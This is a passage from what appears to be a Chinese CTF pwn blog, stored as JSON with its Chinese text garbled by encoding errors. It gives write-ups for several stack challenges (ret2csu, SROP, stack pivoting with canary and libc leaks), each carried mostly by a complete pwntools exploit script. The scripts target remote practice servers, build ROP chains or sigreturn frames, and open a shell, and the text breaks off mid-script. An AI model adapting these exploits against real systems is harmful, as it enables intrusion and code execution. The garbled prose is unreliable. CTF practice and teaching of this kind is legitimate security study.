bufçš„èµ·å§‹ä½ç½®æ˜¯0x7fffffffdd70ï¼Œ70åˆ°80ä¹‹é—´æ˜¯bufçš„16ç©ºé—´ æ ˆä¸Š0x7fffffffdd90å¯¹åº”çš„æ•°æ®æ˜¯ä¸€ä¸ªæ ˆ ä¸Šçš„åœ°å€æ‰€ä»¥é€‰æ‹©è¯»å–è¿™ä¸ªä½ç½®çš„åœ°å€ å¹¶è®¡ç®—å‡ºå®ƒå’Œbufä¹‹é—´çš„åç§»ä»¥ç²¾å‡†å®šä½bufçš„å¤´éƒ¨ ä¸” è¿™ä¸ªå‡½æ•°è¿”å›æ—¶ç›´æ¥retï¼Œæ²¡æœ‰è¿›è¡Œpop ebpçš„æ“ä½œï¼Œæ‰€ä»¥åœ¨æ„é€ payloadçš„æ—¶å€™ä¸éœ€è¦è¦†ç›–ebp è„šæœ¬ 123456payload=b&quot;a&quot;*16+p64(vuln)p.sendline(payload)p.recv(32)place=u64(p.recv(8))bin_sh=place-0x118print(hex(bin_sh)) è°ƒç”¨64ä½æ—¶ï¼Œè®¾è®¡åé—¨å‡½æ•°éœ€è¦rax&#x3D;59ï¼ˆ#define__NR_execve 59ï¼‰;rdi&#x3D;â€&#x2F;bin&#x2F;shâ€;rsi&#x3D;0;rdx&#x3D;0; rax&#x3D;59åœ°å€å·²ç»æ‰¾åˆ°äº† ROPgadgetså‘½ä»¤æŸ¥çœ‹ï¼Œå‘ç°åªæœ‰å¯¹rdiå’Œrsiçš„sæ“ä½œ å‰©ä¸‹çš„å°±æ˜¯åŸºæœ¬çš„csuäº† 123456rbx_rbp_r12_r13_r14_r15#r13&gt;rdx r14&gt;rsi r15&gt;edi#call r12+rbx*8#add rbx, 1#cmp rbx, rbp è®¾ç½®å¥½rdxã€rsiã€rdiï¼Œç„¶åè°ƒç”¨ syscall é¦–å…ˆr14å’Œr13ä¸€å®šè¦èµ‹å€¼ä¸º0ï¼Œè€Œä¸”r15dçš„å€¼ å‡½æ•°ä¼šè·³è½¬åˆ°r12+rbx*8,è®©å®ƒæœ€åä¿®æ”¹rdiç„¶åæ‰§è¡Œè°ƒç”¨syscallï¼Œæ‰€ä»¥r12è¦èµ‹å€¼ä¸ºpayloadä¸­çš„pop rdiçš„åœ°æ–¹ï¼Œrbxèµ‹å€¼0 ä¸”åªè°ƒç”¨ä¸€æ¬¡ æ‰€ä»¥rbp&#x3D;1 æœ€ç»ˆæ‰§è¡Œ 12mov rax, 59 ; syscall number for execvesyscall è„šæœ¬ 123456payload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3payload += p64(mov) + p64(rax)payload += p64(rdi) + p64(bin_sh) + p64(syscall)p.sendline(payload)p.interactive() æ³¨æ„ âœ… mov edi, r15då’Œ rdi çš„å…³ç³» 1mov edi, r15d åªçœ‹è¯­æ³•ï¼Œæ˜¯ï¼š æŠŠ r15dçš„å€¼ï¼ˆ32 ä½ï¼‰èµ‹ç»™ ediï¼ˆä¹Ÿæ˜¯ 32 ä½ï¼‰ ä½†è¿™é‡Œæœ‰ä¸ªå…³é”®ç‚¹ï¼š åœ¨ x86-64 æ¶æ„ä¸­ï¼Œå¯¹ rdi çš„ä½ 32 ä½å†™å…¥ï¼ˆediï¼‰æ—¶ï¼Œé«˜ 32 ä½ä¼šè¢«æ¸…é›¶ï¼ ğŸ” ä¸¾ä¸ªä¾‹å­ 12mov rdi, 0x4141414141414141mov edi, 0x42424242 æ‰§è¡Œå®Œç¬¬äºŒæ¡æŒ‡ä»¤åï¼Œrdiçš„å€¼æ˜¯ï¼š 1rdi == 0x0000000042424242 ä¹Ÿå°±æ˜¯è¯´ï¼š å†™ edi ç›¸å½“äºå…ˆæ¸…ç©º rdiï¼Œå†å†™ä½ 32 ä½ mov edi, r15då…¶å®ç­‰ä»·äºï¼š 1rdi = r15 &amp; 0xffffffff æ‰€ä»¥ä½ èƒ½ç”¨å®ƒæ¥è®¾ç½® rdi çš„å€¼å‰ææ˜¯ä½ è®¾ç½®çš„ r15 æ˜¯ä¸€ä¸ª 32 ä½ä»¥å†…çš„åœ°å€ï¼ˆæˆ–è€…å€¼ï¼‰ï¼Œæ¯”å¦‚ &#x2F;bin&#x2F;sh çš„åœ°å€å¿…é¡»ä½äº 0x100000000ï¼Œå¦åˆ™ä¼šä¸¢é«˜ä½ï¼Œå¯¼è‡´ execve å´©æºƒæˆ– syscall å‚æ•°é”™è¯¯ æ‰€ä»¥è¦ä¹‹åå†æ”¾è®¾ç½®rdiçš„å€¼ è„šæœ¬1234567891011121314151617181920212223242526272829303132from pwn import *#p=process(&quot;./ciscn_s_3&quot;)p=remote(&quot;node5.buuoj.cn&quot;,28493)syscall=0x400517vuln=0x4004EDrdi=0x4005a3rax=0x4004E2pop6=0x40059A#rbx_rbp_r12_r13_r14_r15mov=0x400580#r13&gt;rdx r14&gt;rsi r15&gt;edi #call r12+rbx*8 #add rbx, 1 #cmp rbx, rbp payload=b&quot;a&quot;*16+p64(vuln)p.sendline(payload)p.recv(32)place=u64(p.recv(8))bin_sh=place-0x118print(hex(bin_sh))payload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3payload += p64(mov) + p64(rax)payload += p64(rdi) + p64(bin_sh) + p64(syscall)p.sendline(payload)p.interactive() SROP é¢˜ç›®ä¸­ä¹Ÿæœ‰sigframe SROP æ”»å‡»çš„åŸç† å†…æ ¸ä¿å­˜ä¸Šä¸‹æ–‡ï¼ˆæ­¥éª¤ â‘ ï¼‰ï¼šå½“ç¨‹åºæ¥æ”¶åˆ°ä¿¡å·æ—¶ï¼Œå†…æ ¸ä¼šæš‚åœç¨‹åºçš„æ‰§è¡Œï¼Œå¹¶è‡ªåŠ¨å°†å½“å‰æ‰€æœ‰å¯„å­˜å™¨ï¼ˆrax, rdi, rsi, rdx, rip, rsp ç­‰ï¼‰çš„çŠ¶æ€ä¿å­˜åˆ°ä¸€ä¸ªç‰¹æ®Šçš„ç»“æ„ä½“ä¸­ï¼Œè¿™ä¸ªç»“æ„ä½“å«åš sigcontextã€‚ç„¶åï¼Œå†…æ ¸å°†è¿™ä¸ª sigcontext å‹å…¥æ ˆä¸­ï¼Œä¸ºæ‰§è¡Œä¿¡å·å¤„ç†å‡½æ•°åšå‡†å¤‡ã€‚ æ”»å‡»è€…ä¼ªé€ ä¸Šä¸‹æ–‡ï¼šæ”»å‡»è€…åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ï¼Œåœ¨ç¨‹åºæ¥æ”¶ä¿¡å·ä¹‹å‰ï¼Œå°±å‘æ ˆä¸­å†™å…¥ä¸€ä¸ªä¼ªé€ çš„ sigcontext ç»“æ„ä½“ã€‚è¿™ä¸ªä¼ªé€ çš„ç»“æ„ä½“ä¸­åŒ…å«äº†æ”»å‡»è€…æƒ³è¦è®¾ç½®çš„æ‰€æœ‰å¯„å­˜å™¨å€¼ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥æŠŠ rip è®¾ç½®ä¸º execve çš„åœ°å€ï¼ŒæŠŠ rdi è®¾ç½®ä¸º /bin/sh å­—ç¬¦ä¸²çš„åœ°å€ã€‚ è§¦å‘ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼šæ”»å‡»è€…é€šè¿‡æ„é€  ROP é“¾ï¼Œä½¿ç¨‹åºæ‰§è¡Œæµè·³è½¬åˆ°ä¸€ä¸ªèƒ½å¤Ÿæ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨çš„ gadgetã€‚sigreturn æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå®ƒçš„åŠŸèƒ½å°±æ˜¯ä»æ ˆä¸­è¯»å– sigcontext ç»“æ„ä½“ï¼Œå¹¶æ¢å¤å¯„å­˜å™¨çŠ¶æ€ã€‚æ”»å‡»è€…é€šå¸¸ä¼šæ‰¾åˆ°ä¸€ä¸ª mov rax, 0xf; syscall; è¿™æ ·çš„ gadgetï¼Œå…¶ä¸­ 0xf æ˜¯ sigreturn ç³»ç»Ÿè°ƒç”¨çš„ç¼–å·ã€‚ å†…æ ¸æ¢å¤ä¸Šä¸‹æ–‡ï¼ˆæ­¥éª¤ â‘¢ï¼‰ï¼šå½“ syscall æ‰§è¡Œåï¼Œå†…æ ¸ä¼šå‘ç° rax çš„å€¼ä¸º 0xfï¼Œä¾¿ä¼šæ‰§è¡Œ sigreturnã€‚æ­£å¦‚ä½ æ‰€è¯´ï¼Œå†…æ ¸åœ¨æ‰§è¡Œè¿™ä¸€æ­¥æ—¶ä¸ä¼šå»æ ¡éªŒæ ˆä¸Šæ•°æ®çš„åˆæ³•æ€§ã€‚å®ƒä¼šç›²ç›®åœ°ä¿¡ä»»æ ˆä¸Šçš„æ•°æ®ï¼Œä»æ ˆé¡¶è¯»å–æˆ‘ä»¬ä¼ªé€ çš„ sigcontext ç»“æ„ä½“ï¼Œå¹¶ç”¨é‡Œé¢çš„å€¼æ¥æ¢å¤æ‰€æœ‰çš„å¯„å­˜å™¨ã€‚ åŠ«æŒç¨‹åºæ‰§è¡Œæµï¼ˆæ­¥éª¤ â‘£ï¼‰ï¼šç”±äºæˆ‘ä»¬å·²ç»å°†ä¼ªé€ çš„ sigcontext ä¸­çš„ rip è®¾ç½®ä¸º execve çš„åœ°å€ï¼Œrdi è®¾ç½®ä¸º /bin/sh çš„åœ°å€ï¼Œç¨‹åºæ¢å¤å¯„å­˜å™¨åï¼Œä¼šç«‹å³è·³è½¬åˆ° execve å‡½æ•°æ‰§è¡Œï¼Œå¹¶ä»¥ /bin/sh ä½œä¸ºå‚æ•°ï¼Œæœ€ç»ˆè·å¾—ä¸€ä¸ª Shellã€‚ è„šæœ¬123456789101112131415161718192021222324252627282930from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;] p=remote(&quot;node5.buuoj.cn&quot;,27869)syscall_ret = 0x0400517data = 0x0601020mov_rax_0xf = 0x4004DA#ä¸¤æ¬¡Sigreturnï¼Œç¬¬ä¸€æ¬¡è¾“å…¥/bin/sh\\x00#ç¬¬äºŒæ¬¡æ‰§è¡Œexecve(&quot;/bin/sh&quot;,0,0)vuln = 0x04004ED payload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;a&#x27;*8 + p64(vuln)p.send(payload)p.recv(0x20)bin_sh = u64(p.recv(8)) - 280print(&quot;bin_sh_addr =================== &quot;,hex(bin_sh)) #ç¬¬äºŒæ¬¡Sigreturnpayload = [ b&#x27;/bin/sh\\x00&#x27;,b&#x27;a&#x27;*0x8,mov_rax_0xf,syscall_ret]#å…ˆè®¾è®¡raxçš„å€¼ï¼Œç„¶åsyscallå»è§¦å‘è¿™ä¸ªframe = SigreturnFrame()frame.rax = 59frame.rdi = bin_shframe.rsi = 0frame.rdx = 0frame.rip = syscall_retpayload.append(bytes(frame))p.sendline(flat(payload))p.interactive()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"gdb","slug":"gdb","permalink":"http://example.com/tags/gdb/"},{"name":"csu","slug":"csu","permalink":"http://example.com/tags/csu/"},{"name":"SROP","slug":"SROP","permalink":"http://example.com/tags/SROP/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"æ ˆè¿ç§»","slug":"æ ˆè¿ç§»","date":"2025-08-01T07:14:49.000Z","updated":"2025-09-02T01:47:50.664Z","comments":true,"path":"2025/08/01/æ ˆè¿ç§»/","permalink":"http://example.com/2025/08/01/%E6%A0%88%E8%BF%81%E7%A7%BB/","excerpt":"","text":"åŸºç¡€ä¸¤ä¸ªå¯¹bufçš„è¾“å…¥pwn75 ä½ç½®ä¸å¤Ÿï¼Œä¸”æœ‰systemå‡½æ•°ä½†æ²¡æœ‰â€œ&#x2F;bin&#x2F;shâ€å­—ç¬¦ä¸² æ€è·¯æ³„éœ²ebpçš„åœ°å€ï¼Œç„¶ågdbè°ƒè¯•æ‰¾åˆ°bufå¼€å¤´å’Œebpä¹‹é—´çš„åç§»ä»¥æ‰¾åˆ°bufçš„ä½ç½® ä¹‹åé€šè¿‡ç¬¬äºŒæ¬¡è¾“å…¥å¯¹è°ƒç”¨systemå‡½æ•°ï¼Œå¹¶åœ¨payloadä¸­ä¼ å…¥å­—ç¬¦ä¸²â€œ&#x2F;bin&#x2F;sh\\x00â€ï¼Œä¹‹åé€šè¿‡è¿™ä¸ªå‡½æ•°çš„retè®©ç¨‹åºè¿”å›åˆ°bufå¼€å¤´å¤„æ‰§è¡Œåé—¨å‡½æ•° å·®æ˜¯0x38 è„šæœ¬123456789101112131415161718192021222324252627from pwn import *context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#p = process(&#x27;./pwn75&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28124)p.recvuntil(b&quot;codename:&quot;)payload=b&quot;a&quot;*0x24+b&quot;1234&quot;p.send(payload)p.recvuntil(b&quot;1234&quot;)ebp = u32(p.recv(4))print(hex(ebp))leave=0x080486ACsystem=0x08048400main=0x08048768off=0x38buf=ebp-offp.recvuntil(b&quot;want to do?&quot;)payload=p32(system)+p32(main)+p32(buf+12)+b&quot;/bin/sh\\x00&quot;payload=payload.ljust(0x28,b&quot;a&quot;)payload+=p32(buf-4)+p32(leave)p.sendline(payload)p.interactive() 1payload=p32(system)+p32(main)+p32(buf+12)+b&quot;/bin/sh\\x00&quot; æŠŠ&#x2F;bin&#x2F;shå­—ç¬¦æ®µé€šè¿‡payloadæ”¾å…¥æ ˆä¸Šï¼Œä¹‹åå†systemå‡½æ•°çš„çš„å‚æ•°ä½ç½®æ”¾ç½®&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„ä½ç½® 12345payload=b&quot;a&quot;*0x24+b&quot;1234&quot;p.send(payload)p.recvuntil(b&quot;1234&quot;)ebp = u32(p.recv(4))print(hex(ebp)) æ³¨æ„sendlineä¼šåœ¨å‘é€payloadä¹‹åå†å‘é€ä¸€ä¸ª&#x2F;n ä¼šå½±å“æ¥æ”¶æ•°æ® ä¸€ä¸ªsä¸€ä¸ªbuf[Black Watch å…¥ç¾¤é¢˜]PWN æ²¡æœ‰systemå‡½æ•° æ€è·¯é€šè¿‡sè®¾ç½®ropé“¾æ³„éœ²gotè¡¨åœ°å€ï¼Œä¹‹åè¿”å›mainå‡½æ•°ç»§ç»­æ‰§è¡Œï¼Œbufè¿”å›så»æ‰§è¡Œropé“¾ é€šè¿‡æ³„éœ²çš„gotè¡¨åœ°å€å¾—åˆ°systemçš„éœ€è¦ä¿¡æ¯ï¼Œæ„é€ åé—¨å‡½æ•° åœ¨sæ”¾ç½®æ„é€ å¥½çš„åé—¨å‡½æ•°ï¼Œé€šè¿‡bufè®©å‡½æ•°è¿›å…¥æ‰§è¡Œ è„šæœ¬1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from LibcSearcher import *context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#p= process(&#x27;./spwn&#x27;)p= remote(&quot;node5.buuoj.cn&quot;,28120)elf=ELF(&quot;./spwn&quot;)#gdb.attach(p,&quot;b *0x08048511&quot;)#bss=elf.bss()s=0x0804A300write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]main=0x8048513leave=0x08048511payload=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)p.recvuntil(b&quot;What is your name?&quot;)p.send(payload)p.recvuntil(b&quot;What do you want to say?&quot;)payload1=b&quot;a&quot;*24+p32(s-4)+p32(leave)p.send(payload1)write=u32(p.recv(4))print(hex(write))libc=LibcSearcher(&quot;write&quot;,write)libc_base=write-libc.dump(&#x27;write&#x27;)system=libc_base+libc.dump(&#x27;system&#x27;)sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=p32(system)+p32(0)+p32(sh)p.recvuntil(b&quot;What is your name?&quot;)p.send(payload)p.recvuntil(b&quot;What do you want to say?&quot;)p.send(payload1)p.interactive() æ³¨æ„:è¿”å›åœ°å€å¿…é¡»å†™mainçš„åœ°å€ åœ¨ vul_function å‡½æ•°ä¸­ï¼Œç¨‹åºä¼šåœ¨æ ˆä¸Šåˆ›å»ºä¸€ä¸ªåä¸ºbuf çš„ç¼“å†²åŒºã€‚ å¦‚æœä½ çš„ ROP é“¾æ²¡æœ‰å›åˆ° mainï¼Œè€Œæ˜¯ç›´æ¥å›åˆ° vul_functionï¼Œé‚£ä¹ˆ vul_function åœ¨é‡æ–°æ‰§è¡Œæ—¶ä¼šå†æ¬¡åˆ›å»ºæ ˆå¸§ï¼Œè¿™å¯èƒ½ä¼šå½±å“ä½ ç¬¬ä¸€æ¬¡æ³„æ¼ååœ¨ .bss åŒºåŸŸå¸ƒç½®çš„ ROP é“¾ã€‚ main å‡½æ•°çš„ç»“æ„éå¸¸ç®€å•ï¼Œå®ƒåªè°ƒç”¨ vul_functionï¼Œå› æ­¤å®ƒçš„æ ˆå¸§éå¸¸ç¨³å®šï¼Œä¸ä¼šå¹²æ‰° bss æ®µä¸­çš„æ•°æ®ã€‚ å½“vul_functionå‡½æ•°å¯ä»¥æ­£å¸¸è¿”å›çš„æ—¶å€™ï¼Œå®ƒçš„æ ˆå¸§ä¼šè¢«æ¸…ç†è€Œä¸å½±å“ä¸‹ä¸€æ­¥ è¿›é˜¶canary+è¿ç§»é™„ä»¶ è¾“å…¥çš„æœ€è¿œä½ç½®åªåˆ°retçš„åœ°å€ï¼Œè€Œä¸”æ²¡æœ‰systemå‡½æ•°ï¼Œæ‰€ä»¥è¦æ ˆè¿ç§» è€Œä¸”æœ‰canaryæ³„éœ² æ‰€ä»¥æ¥æ”¶bufçš„åœ°å€ä¹‹åï¼Œé€šè¿‡printfçš„è¾“å‡ºæ³„éœ²canary,ç„¶ååœ¨bufä¸Šå¸ƒç½®æ³„éœ²libcçš„å‡½æ•°(è¿”å›åœ°å€å†™main),è®©å‡½æ•°è·³è½¬è¿‡å»æ‰§è¡Œä¹‹åæ³„éœ²ï¼Œä¹‹åç”¨æ³„éœ²libcåŸºåœ°å€å»æ‹¿åˆ°shell åˆå§‹æ—¶æ“ä½œç³»ç»Ÿä¸ºç¨‹åºåˆ†é…äº†å†…å­˜ï¼Œå…¶ä¸­å°±åŒ…æ‹¬åˆå§‹æ ˆç©ºé—´ï¼ˆbuf),ä¹‹åæ ˆè¿ç§»è·³è½¬åˆ°bufæ®µï¼Œå†æ¬¡è¿›å…¥mainå‡½æ•°ï¼Œç¨‹åºåœ¨è¿™é‡Œå†æ¬¡åˆ›å»ºæ ˆå¸§ï¼Œæ‰€ä»¥è¾“å‡ºçš„bufçš„åœ°å€ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¦é‡æ–°æ¥æ”¶åœ°å€ è„šæœ¬12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./111&quot;remote_host = &quot;node4.anna.nssctf.cn&quot;remote_port = 28483context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p, &quot;b*0x04012D7&quot;)p.recvuntil(b&quot;Before you start to attack, I give you a small gift\\n&quot;)p.recvuntil(b&quot;0x&quot;)buf=int(p.recv(12),16)print(b&quot;buf==============&quot;+hex(buf).encode())puts_plt=elf.plt[&#x27;puts&#x27;]read_got=elf.got[&#x27;read&#x27;]main=0x40120Aleave=0x4012D7 rdi=0X401205ret=0X40101apayload1 = b&#x27;a&#x27; *0x28+ b&#x27;b&#x27;p.send(payload1)p.recvuntil(b&#x27;b&#x27;)canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;))print(f&quot;canary -------------------:&#123;hex(canary)&#125;&quot;)pay=p64(rdi) + p64(read_got) + p64(puts_plt)+ p64(ret)+p64(main)+ p64(canary)+p64(buf-8)+p64(leave)p.recvuntil(b&quot;The last read??&quot;)p.send(pay)read= u64(p.recvuntil(&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(f&quot;read: &#123;hex(read)&#125;&quot;)libc = LibcSearcher(&quot;read&quot;, read)libc_base = read - libc.dump(&quot;read&quot;)system= libc_base + libc.dump(&#x27;system&#x27;)bin= libc_base + libc.dump(&#x27;str_bin_sh&#x27;)print(b&quot;base=============&quot;+hex(libc_base).encode())# rsi=libc_base+0x2be51# rdx=libc_base+0xa5722p.recvuntil(b&quot;0x&quot;)buf=int(p.recv(12),16)print(b&quot;buf==============&quot;+hex(buf).encode())p.send(b&#x27;a&#x27;)pay=p64(rdi)+p64(bin)+p64(system)+b&quot;a&quot;*0x10+p64(canary) + p64(buf- 0x8) + p64(leave)p.recvuntil(b&quot;The last read??&quot;)p.sendline(pay)p.interactive() æ”¶è· ä»£è¡¨æ ˆä¸å¹³è¡¡ lea_readé™„ä»¶ å¯ä»¥çœ‹åˆ°æ²¡æœ‰æ³„éœ²åœ°å€çš„æœºä¼šï¼Œä½†æ˜¯readæœ¬èº«çš„æ¯”è¾ƒç‰¹æ®Š readçš„è¯»å…¥åœ°å€æ˜¯å­˜å‚¨çš„æ˜¯bufçš„åœ°å€ï¼Œä½†æ˜¯å®é™…æ˜¯æŒ‰ç…§å…¶ç›¸å¯¹äºrbpçš„åç§»æ¥ç¡®å®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠrbpèµ‹å€¼ä¸ºæˆ‘ä»¬è¦å†™å…¥çš„åœ°å€+bufçš„off,ä¹‹åæŠŠretçš„åœ°å€è¦†ç›–ä¸º lea rax, [rbp+buf]çš„åœ°å€ï¼Œè¿™é‡Œä¸»è¦æ˜¯å› ä¸ºåé¢ä¼šæœ‰èµ‹å€¼æŠŠraxçš„æ•°å€¼èµ‹å€¼ç»™rdiï¼Œä»¥å®ç°åæœŸçš„readè¯»å…¥åœ°å€çš„æ”¹å˜ï¼Œå·²ç»readå‡½æ•°çš„è°ƒç”¨ è¿™é‡Œæˆ‘ä»¬å¯ä»¥è®©å‡½æ•°è·³è½¬åˆ°bssæ®µï¼Œä½†æ˜¯æ³¨æ„bssæ®µå¤´éƒ¨é€šå¸¸ä¼šå­˜æ”¾ä¸€äº›ç¨‹åºåˆå§‹åŒ–æ—¶ä½¿ç”¨çš„å…¨å±€å˜é‡ã€‚ä¸ºäº†é¿å…è¦†ç›–è¿™äº›é‡è¦æ•°æ®ï¼Œé€šå¸¸ä¼šå°†æ ˆè¿ç§»çš„åœ°å€ç¨å¾®å¾€åç§»åŠ¨ä¸€äº›ï¼Œç•™å‡ºè¶³å¤Ÿçš„ç©ºé—´ã€‚ ä¸€ä¸ªå¯¹æ”»å‡»æœ‰ç”¨çš„ lea æŒ‡ä»¤è¦æ»¡è¶³ï¼š è®¡ç®—å‡ºçš„åœ°å€ä¾èµ–ä½ èƒ½æ§åˆ¶çš„åŸºå€ï¼ˆå¦‚ rbpï¼‰ï¼› ç»“æœå¯„å­˜å™¨ä¼šä¼ é€’åˆ°å‡½æ•°å‚æ•°é‡Œï¼ˆå¦‚ rsi, rdiï¼‰ï¼› åç»­å‡½æ•°è°ƒç”¨ï¼ˆå¦‚ read, putsï¼‰ä¼šçœŸçš„ä½¿ç”¨è¿™ä¸ªåœ°å€ï¼› ä¸è¦æœ‰å‰¯ä½œç”¨ç ´åæ”»å‡»ç¯å¢ƒã€‚ .bss æ®µæ˜¯ä¸€ä¸ªæœªåˆå§‹åŒ–çš„æ•°æ®æ®µï¼Œå®ƒçš„å¤§å°é€šå¸¸åœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œä½†å…¶ä¸­çš„å¤§éƒ¨åˆ†ç©ºé—´å¯èƒ½æ²¡æœ‰è¢«ä»»ä½•å·²çŸ¥çš„å˜é‡å ç”¨ã€‚ IDA æ˜¾ç¤ºäº† .bss æ®µä» 0x404040 å¼€å§‹ï¼Œåˆ° 0x404069 ç»“æŸï¼Œè¿™è¡¨ç¤ºåœ¨è¿™ä¸ªèŒƒå›´å†…ï¼ŒIDA æ‰¾åˆ°äº†å·²çŸ¥çš„ç¬¦å·ï¼ˆå¦‚stdinã€stderrç­‰ï¼‰ã€‚ ç„¶è€Œï¼Œè¿™å¹¶ä¸æ„å‘³ç€ .bss æ®µåªåˆ° 0x404069ã€‚ç¨‹åºçš„ .bss æ®µçš„å®é™…å¤§å°å¯ä»¥åœ¨ ELF æ–‡ä»¶çš„å¤´éƒ¨ä¿¡æ¯ä¸­æ‰¾åˆ°ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œ.bss æ®µä¼šæ¯” IDA æ˜¾ç¤ºçš„å·²çŸ¥ç¬¦å·èŒƒå›´å¤§å¾—å¤šã€‚ ç®€å•æ¥è¯´ï¼ŒIDA å°±åƒä¸€ä¸ªå›¾ä¹¦é¦†ç›®å½•ï¼Œåªåˆ—å‡ºäº†æœ‰åå­—çš„ä¹¦ï¼ˆç¬¦å·ï¼‰ï¼Œä½†å¹¶ä¸ä¼šæŠŠæ‰€æœ‰ç©ºä¹¦æ¶ï¼ˆæœªä½¿ç”¨çš„åœ°å€ï¼‰éƒ½ä¸€ä¸€åˆ—å‡ºæ¥ã€‚å¯ä»¥åœ¨ä»»ä½•ç©ºä¹¦æ¶ä¸Šæ”¾ç½®ä½ çš„ä¸œè¥¿ï¼Œåªè¦å®ƒå±äºè¿™ä¸ªå›¾ä¹¦é¦†ï¼ˆ.bss æ®µï¼‰å³å¯ã€‚ æ ˆè¿ç§»çš„ç›®æ ‡åœ°å€å¿…é¡»æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š å¯å†™ï¼š è¯¥å†…å­˜åŒºåŸŸå¿…é¡»æ˜¯å¯å†™çš„ï¼Œå› ä¸ºæˆ‘ä»¬è¦æŠŠä¼ªé€ çš„ROPé“¾å†™å…¥åˆ°è¿™ä¸ªä½ç½®ã€‚bssæ®µå°±æ˜¯å¯å†™çš„ã€‚ ä¸è¢«å ç”¨ï¼š è¯¥åŒºåŸŸä¸èƒ½è¢«ç¨‹åºå½“å‰ä½¿ç”¨çš„å…¶ä»–æ•°æ®ï¼ˆå¦‚å…¨å±€å˜é‡ï¼‰å ç”¨ï¼Œå¦åˆ™ä¼šè¦†ç›–æ•°æ®ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚ ä¹‹æ‰€ä»¥é€‰æ‹©bssæ®µï¼Œæ˜¯å› ä¸ºå®ƒåœ¨ç¨‹åºè¿è¡ŒæœŸé—´é€šå¸¸æ˜¯æœªè¢«åˆå§‹åŒ–çš„ï¼Œå› æ­¤å¯ä»¥å®‰å…¨åœ°ç”¨äºå­˜æ”¾æˆ‘ä»¬çš„ROPé“¾ã€‚è€Œä½¿ç”¨0x405000ï¼ˆæˆ–è€…è„šæœ¬ä¸­çš„0x404500ï¼‰ï¼Œå¯èƒ½æ˜¯ä¸ºäº†é¿å…ä¸bssæ®µèµ·å§‹å¤„çš„å…¨å±€å˜é‡å‘ç”Ÿå†²çªï¼Œå› ä¸ºbssæ®µçš„èµ·å§‹éƒ¨åˆ†å¯èƒ½è¢«ç”¨æ¥å­˜å‚¨ä¸€äº›æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ã€‚ æ‰€ä»¥æˆ‘ä»¬æ„é€ çš„æ—¶å€™å°½é‡å¼€ä¸€ä¸ªæ–°é¡µï¼Œé€‰æ‹©ä¸€ä¸ªé¡µå¯¹é½çš„åœ°å€ï¼Œæˆ–è€…è‡³å°‘æ˜¯ä¸€ä¸ªè¾ƒå¤§çš„ã€è¿œç¦»å·²çŸ¥æ•°æ®çš„åç§»åœ°å€ã€‚.bss æ®µçš„é¦–åœ°å€é€šå¸¸è¢«ç¨‹åºç”¨æ¥å­˜æ”¾ä¸€äº›é‡è¦çš„å…¨å±€å˜é‡ã€‚ è„šæœ¬12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *import sysfrom LibcSearcher import *file_path = &quot;./222&quot;remote_host = &quot;node4.anna.nssctf.cn&quot;remote_port = 28483context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(file_path)if &#x27;re&#x27; in sys.argv: p = remote(remote_host, remote_port)else: p = process(file_path) #gdb.attach(p, &quot;b*0x401211&quot;)def sla(a, b): p.sendlineafter(a, b)def ru(a): p.recvuntil(a)def sa(a, b): p.sendafter(a, b) bss=0x404500main=0x4011DB rdi=0x401225leave=0x40121Bread=0x401200rbp=0x40115dputs_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]ret=0x40101apay1=b&quot;a&quot;*0x50+p64(bss+0x50)+p64(read)sa(b&quot;Xswlhhh!Use stack hijacking on him!&quot;,pay1)pay=p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(rbp)+p64(bss+0x200+0x50)+p64(read)pay=pay.ljust(0x50,b&quot;a&quot;)+p64(bss-8)+p64(leave)p.send(pay)puts = u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, 